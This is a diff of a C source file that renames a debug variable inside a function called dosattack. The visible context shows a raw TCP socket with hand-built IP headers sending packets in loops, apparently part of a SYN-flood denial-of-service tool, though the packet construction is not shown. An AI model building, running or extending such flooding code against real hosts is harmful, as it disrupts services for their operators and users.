@@ -60,7 +60,7 @@ unsigned short csum(unsigned short *ptr, int nbytes)
 void dosattack(const struct AHTTP_INPUT *ainput)
 {
     struct AHTTP_INPUT *ptmp = (struct AHTTP_INPUT *)ainput;
-    int debug_mode = ptmp->DebugMode;
+    int debug_level = ptmp->DebugMode;
 
     //Create a raw socke
     int socket_fd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
@@ -146,7 +146,7 @@ void dosattack(const struct AHTTP_INPUT *ainput)
     const int *val = &one;
     if (setsockopt(socket_fd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
     {
-        debug(debug_mode, 2, "Error setting IP_HDRINCL. Error number: %d - Error message: %s", errno, strerror(errno));
+        debug(debug_level, 2, "Error setting IP_HDRINCL. Error number: %d - Error message: %s", errno, strerror(errno));
         exit(0);
     }
 
@@ -154,7 +154,7 @@ void dosattack(const struct AHTTP_INPUT *ainput)
     int len = sizeof(int);
     if (setsockopt(socket_fd, SOL_SOCKET, SO_REUSEADDR, &flag, len) < 0)
     {
-        debug(debug_mode, 2, "Error setting SO_REUSEADDR. Error number: %d - Error message: %s", errno, strerror(errno));
+        debug(debug_level, 2, "Error setting SO_REUSEADDR. Error number: %d - Error message: %s", errno, strerror(errno));
         exit(0);
     }
 
@@ -176,14 +176,14 @@ void dosattack(const struct AHTTP_INPUT *ainput)
                     (struct sockaddr *)&sin, // socket addr, just like in
                     sizeof(sin)) < 0)        // a normal send()
             {
-                debug(debug_mode, 2, "Attack send error");
+                debug(debug_level, 2, "Attack send error");
                 break;
             }
             // Data send successfull
             /*
             else
             {
-                debug(debug_mode, 2, "Attack packet end successful");
+                debug(debug_level, 2, "Attack packet end successful");
             }
             */
         }
@@ -201,12 +201,12 @@ void dosattack(const struct AHTTP_INPUT *ainput)
                     (struct sockaddr *)&sin, // socket addr, just like in
                     sizeof(sin)) < 0)        // a normal send()
             {
-                debug(debug_mode, 2, "Attack send error");
+                debug(debug_level, 2, "Attack send error");
             }
             // Data send successfully
             else
             {
-                debug(debug_mode, 2, "Attack packet end successful");
+                debug(debug_level, 2, "Attack packet end successful");
             }
         }
     }
